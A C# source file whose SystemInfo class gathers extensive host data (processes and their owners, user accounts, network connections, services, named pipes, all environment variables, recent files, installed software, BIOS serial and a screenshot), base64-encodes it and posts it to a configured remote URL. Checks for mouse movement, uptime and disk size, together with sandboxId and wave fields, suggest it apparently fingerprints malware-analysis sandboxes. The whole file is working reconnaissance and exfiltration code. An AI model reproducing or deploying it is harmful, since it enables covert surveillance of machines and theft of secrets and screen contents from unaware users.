using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.NetworkInformation;
using System.ServiceProcess;
using System.Threading;
using System.Collections;
using System.Drawing;
using System.Windows.Forms;
using System.Drawing.Imaging;
using Microsoft.Win32;
using System.Net;

namespace Neton
{
    class SystemInfo
    {
        public static string GetNetworkInfo()
        {
            List<string> lRes = new List<string>();
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (nic.OperationalStatus == OperationalStatus.Up)
                {
                    lRes.Add(string.Format("{0} | {1}", nic.Name, nic.GetPhysicalAddress().ToString()));
                }
            }
            string response = string.Join("\n", lRes.ToArray());
            return response;
        }

        public static string GetBIOSserNo()
        {
            ManagementObjectSearcher searcher = new ManagementObjectSearcher("root\\CIMV2", "SELECT * FROM Win32_BIOS");
            foreach (ManagementObject wmi in searcher.Get())
            {
                try
                {
                    return wmi.GetPropertyValue("SerialNumber").ToString();
                }
                catch (Exception e)
                {
                    #if DEBUG
                        Console.WriteLine("[/] Error: " + e);
                    #endif
                }
            }
            return "Unknown";

        }

        public static string GetPhysicalMemory()
        {
            ManagementScope oMs = new ManagementScope();
            ObjectQuery oQuery = new ObjectQuery("SELECT Capacity FROM Win32_PhysicalMemory");
            ManagementObjectSearcher oSearcher = new ManagementObjectSearcher(oMs, oQuery);
            ManagementObjectCollection oCollection = oSearcher.Get();

            long MemSize = 0;

            // In case more than one Memory sticks are installed
            foreach (ManagementObject obj in oCollection)
            {
                long mCap = Convert.ToInt64(obj["Capacity"]);
                MemSize += mCap;
            }
            MemSize = (MemSize / 1024) / 1024;
            return MemSize.ToString() + "MB";
        }

        //Return the total RAM
        public static string checkComputerRAM()
        {
            double fres = 0;
            try
            {
                ObjectQuery wql = new ObjectQuery("SELECT * FROM Win32_OperatingSystem");
                ManagementObjectSearcher searcher = new ManagementObjectSearcher(wql);
                ManagementObjectCollection results = searcher.Get();

                double res;

                foreach (ManagementObject result in results)
                {
                    res = Convert.ToDouble(result["TotalVisibleMemorySize"]);
                    fres += Math.Round((res / (1024 * 1024)), 2);
                }
            }
            catch (Exception e)
            {
                #if DEBUG
                    Console.WriteLine("[/] Error: " + e);
                #endif
            }
            return fres.ToString();
        }
        public static string GetProcessorInformation()
        {
            ManagementClass mc = new ManagementClass("win32_processor");
            ManagementObjectCollection moc = mc.GetInstances();
            string info = string.Empty;
            foreach (ManagementObject mo in moc)
            {
                string name = (string)mo["Name"];
                name = name.Replace("(TM)", "™").Replace("(tm)", "™").Replace("(R)", "®").Replace("(r)", "®").Replace("(C)", "©").Replace("(c)", "©").Replace("    ", " ").Replace("  ", " ");

                info = name + ", " + (string)mo["Caption"] + ", " + (string)mo["SocketDesignation"];
            }
            return info;
        }

        private static string getFileDescription(string fName)
        {
            FileVersionInfo myFileVersionInfo =
                FileVersionInfo.GetVersionInfo(fName);
            return myFileVersionInfo.FileDescription;
        }

        public static string getModules()
        {
            List<string> lRes = new List<string>();
            try
            {
                Process myProcess = Process.GetCurrentProcess();
                Thread.Sleep(1000);
                ProcessModule myProcessModule;
                ProcessModuleCollection myProcessModuleCollection = myProcess.Modules;
                for (int i = 0; i < myProcessModuleCollection.Count; i++)
                {
                    myProcessModule = myProcessModuleCollection[i];
                    string pInfo = string.Format("{0} | {1} | {2}", myProcessModule.ModuleName, myProcessModule.FileName, getFileDescription(myProcessModule.FileName));
                    lRes.Add(pInfo);
                }
            }
            catch (Exception e)
            {
                #if DEBUG
                    Console.WriteLine("[/] Error: " + e);
                #endif
            }
            string response = string.Join("\n", lRes.ToArray());
            return response;
        }

        public static string ListUsers()
        {
            List<string> lRes = new List<string>();
            SelectQuery query = new SelectQuery("Win32_UserAccount");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject envVar in searcher.Get())
            {
                lRes.Add(envVar["Name"].ToString());
            }
            return string.Join("\n", lRes.ToArray());
        }

        public static string ListGroups()
        {
            List<string> lRes = new List<string>();

            SelectQuery query = new SelectQuery("Win32_Group");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject envVar in searcher.Get())
            {
                lRes.Add(envVar["Name"].ToString());
            }
            return string.Join("\n", lRes.ToArray());
        }

        public static string GetProcessOwner(int processId)
        {
            string query = "Select * From Win32_Process Where ProcessID = " + processId;
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            ManagementObjectCollection processList = searcher.Get();

            foreach (ManagementObject obj in processList)
            {
                string[] argList = new string[] { string.Empty, string.Empty };
                int returnVal = Convert.ToInt32(obj.InvokeMethod("GetOwner", argList));
                if (returnVal == 0)
                {
                    return argList[1] + "\\" + argList[0];
                }
            }
            return "NO OWNER";
        }

        public static string ListProcess()
        {
            List<string> lRes = new List<string>();
            Process[] localAll = Process.GetProcesses();
            foreach (Process p in localAll)
            {
                string username = GetProcessOwner(p.Id);
                string pInfo = string.Format("{0} | {1} | {2} | {3} | {4}", p.ProcessName, p.Id, p.MainWindowTitle, p.SessionId, username);
                lRes.Add(pInfo);
            }
            return string.Join("\n", lRes.ToArray());
        }

        public static string ListConnections()
        {
            List<string> lRes = new List<string>();
            IPGlobalProperties properties = IPGlobalProperties.GetIPGlobalProperties();
            TcpConnectionInformation[] connections = properties.GetActiveTcpConnections();
            foreach (TcpConnectionInformation c in connections)
            {
                string cInfo = string.Format("{0} | {1} | {2}", c.LocalEndPoint.ToString(), c.RemoteEndPoint.ToString(), c.State.ToString());
                lRes.Add(cInfo);
            }
            return string.Join("\n", lRes.ToArray());
        }

        public static string ListServices()
        {
            List<string> lRes = new List<string>();
            ServiceController[] services = ServiceController.GetServices();

            // try to find service name
            foreach (ServiceController service in services)
            {
                string sInfo = string.Format("{0} | {1} | {2} | {3}", service.ServiceName, service.DisplayName, service.Status, service.ServiceType);
                lRes.Add(sInfo);
            }
            return string.Join("\n", lRes.ToArray());
        }

        public static string listDrives()
        {
            var l_drives = new List<string>();

            DriveInfo[] allDrives = DriveInfo.GetDrives();
            foreach (DriveInfo d in allDrives)
            {
                l_drives.Add(d.Name);
            }
            return string.Join("\n", l_drives.ToArray());
        }


        public static string getEnvironmentVariables()
        {
            List<string> lRes = new List<string>();
            foreach (DictionaryEntry de in Environment.GetEnvironmentVariables())
            {
                string sInfo = string.Format("{0} | {1}", de.Key, de.Value);
                lRes.Add(sInfo);
            }
            return string.Join("\n", lRes.ToArray());
        }

        public static string getSystemPipes()
        {
            string[] filePaths = Directory.GetFiles(@"\\.\pipe\");
            return string.Join("\n", filePaths);
        }

        //https://stackoverflow.com/questions/2819934/detect-windows-version-in-net
        public static string getOsVersion()
        {
            var os = Environment.OSVersion;
            return string.Format("{0} | {1} | {2} | {3} | {4}", os.Platform, os.VersionString, os.Version.Major, os.Version.Minor, os.ServicePack);
        }


        public static string takeScreenshot()
        {
            string b64Img = string.Empty;
            string outputPath = "image.png";
            try
            {
                Rectangle bounds = Screen.GetBounds(Point.Empty);
                using (Bitmap bitmap = new Bitmap(bounds.Width, bounds.Height))
                {
                    using (Graphics g = Graphics.FromImage(bitmap))
                    {
                        g.CopyFromScreen(Point.Empty, Point.Empty, bounds.Size);
                    }
                    bitmap.Save(outputPath, ImageFormat.Png);
                }

                Byte[] bytes = File.ReadAllBytes(outputPath);
                b64Img = Convert.ToBase64String(bytes);
                File.Delete(outputPath);
            }
            catch (Exception e)
            {
                #if DEBUG
                    Console.WriteLine("[/] Error: " + e);
                #endif
            }
            return b64Img;
        }

        

        //Return the screen resolution
        public static string checkScreenRes()
        {
            string screenWidth = Screen.PrimaryScreen.Bounds.Width.ToString();
            string screenHeight = Screen.PrimaryScreen.Bounds.Height.ToString();
            return $"{screenWidth} | {screenHeight}";
        }

        //Check the number of monitors
        public static string checkNScreens()
        {
            int currentMonitorCount = Screen.AllScreens.Length;
            return currentMonitorCount.ToString();
        }

        //Check if hard disk drive size and free space are small
        public static string checkHDSize()
        {
            string mainDrive = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));
            DriveInfo[] allDrives = DriveInfo.GetDrives();
            string size = "0 | GB";
            foreach (DriveInfo d in allDrives)
            {
                try
                {
                    if (mainDrive == d.Name)
                    {
                        size = $"{Math.Round(((double)d.TotalSize / (1024 * 1024 * 1024)), 2).ToString()} | GB";
                    }
                }
                catch (Exception e)
                {
                    #if DEBUG
                        Console.WriteLine("[/] Error: " + e);
                    #endif
                }
            }
            return size;
        }

        //Check if system uptime is small
        public static string checkSystemUptime()
        {
            int result = Environment.TickCount & Int32.MaxValue;
            return result.ToString();
        }
        
        //Check recent files
        public static string checkRecentFiles()
        {
            string path = Environment.GetFolderPath(Environment.SpecialFolder.Recent);
            string[] files = null;
            files = Directory.GetFiles(path);
            
            return string.Join("\n", files);
        }
        
        //Check installed apps
        public static string checkInstalledApps()
        {
            List<string> lRes = new List<string>();
            string registry_key = @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall";
            try
            {
                using (Microsoft.Win32.RegistryKey key = Registry.LocalMachine.OpenSubKey(registry_key))
                {
                    foreach (string subkey_name in key.GetSubKeyNames())
                    {
                        using (RegistryKey subkey = key.OpenSubKey(subkey_name))
                        {
                            if (subkey.GetValue("DisplayName") != null || subkey.GetValue("InstallSource") != null)
                            {
                                lRes.Add(string.Format("{0} | {1}", subkey.GetValue("DisplayName"), subkey.GetValue("InstallSource")));
                            }
                        }
                    }
                }
            }
            catch (Exception e)
            {
                #if DEBUG
                    Console.WriteLine("[/] Error: " + e);
                #endif
            }
            return string.Join("\n", lRes);
        }

        //Check mouse position
        public static string checkMousePosition()
        {
            List<string> lRes = new List<string>();
            try
            {
                lRes.Add(string.Format("{0} | {1}", Control.MousePosition.X, Control.MousePosition.Y));
                Thread.Sleep(10000);
                lRes.Add(string.Format("{0} | {1}", Control.MousePosition.X, Control.MousePosition.Y));
            }
            catch (Exception e)
            {
                #if DEBUG
                    Console.WriteLine("[/] Error: " + e);
                #endif
            }
            return string.Join("\n", lRes);
        }

        private static string GetSystemInfo()
        {
            return Helpers.runCommand("systeminfo");
        }

        static void SendInfo(Settings settings, object data)
        {
            
            Helpers.SendData(settings.url, data);
        }

        public static void Launch(Settings settings)
        {
            object data = new
            {
                modules = Helpers.B64e(getModules()),
                processorInformation = Helpers.B64e(GetProcessorInformation()),
                environmentVariables = Helpers.B64e(getEnvironmentVariables()),
                physicalMemory = Helpers.B64e(GetPhysicalMemory()),
                computerRAM = Helpers.B64e(checkComputerRAM()),
                biosSerNo = Helpers.B64e(GetBIOSserNo()),
                networkInfo = Helpers.B64e(GetNetworkInfo()),
                tasklist = Helpers.B64e(ListProcess()),
                users = Helpers.B64e(ListUsers()),
                localgroup = Helpers.B64e(ListGroups()),
                netstat = Helpers.B64e(ListConnections()),
                services = Helpers.B64e(ListServices()),
                dirDrivers = Helpers.B64e(DriveQuery.GetSignatures(true)),
                lDrives = Helpers.B64e(listDrives()),
                systemPipes = Helpers.B64e(getSystemPipes()),
                sysinfoOutput = Helpers.B64e(GetSystemInfo()),
                sandboxId = Helpers.B64e(settings.sandboxId),
                executionId = Helpers.B64e(settings.executionId),
                wave = Helpers.B64e(settings.wave),
                module = Helpers.B64e("systeminfo"),
                version = Helpers.B64e(settings.version),
                md5Hash = Helpers.B64e(settings.md5Hash),
                sha256Hash = Helpers.B64e(settings.sha256Hash),
            };
            SendInfo(settings, data);

            object data2 = new
            {
                osVersion = Helpers.B64e(getOsVersion()),
                screenRes = Helpers.B64e(checkScreenRes()),
                nScreens = Helpers.B64e(checkNScreens()),
                hDSize = Helpers.B64e(checkHDSize()),
                systemUptime = Helpers.B64e(checkSystemUptime()),
                recentFiles = Helpers.B64e(checkRecentFiles()),
                installedApps = Helpers.B64e(checkInstalledApps()),
                mousePosition = Helpers.B64e(checkMousePosition()),
                sandboxId = Helpers.B64e(settings.sandboxId),
                executionId = Helpers.B64e(settings.executionId),
                wave = Helpers.B64e(settings.wave),
                module = Helpers.B64e("systeminfo"),
                version = Helpers.B64e(settings.version),
                md5Hash = Helpers.B64e(settings.md5Hash),
                sha256Hash = Helpers.B64e(settings.sha256Hash),
            };           
            SendInfo(settings, data2);

            object data3 = new
            {
                screenshot = takeScreenshot(),
                sandboxId = Helpers.B64e(settings.sandboxId),
                executionId = Helpers.B64e(settings.executionId),
                wave = Helpers.B64e(settings.wave),
                module = Helpers.B64e("systeminfo"),
                version = Helpers.B64e(settings.version),
                md5Hash = Helpers.B64e(settings.md5Hash),
                sha256Hash = Helpers.B64e(settings.sha256Hash),
            };
            SendInfo(settings, data3);

        }
    }
}
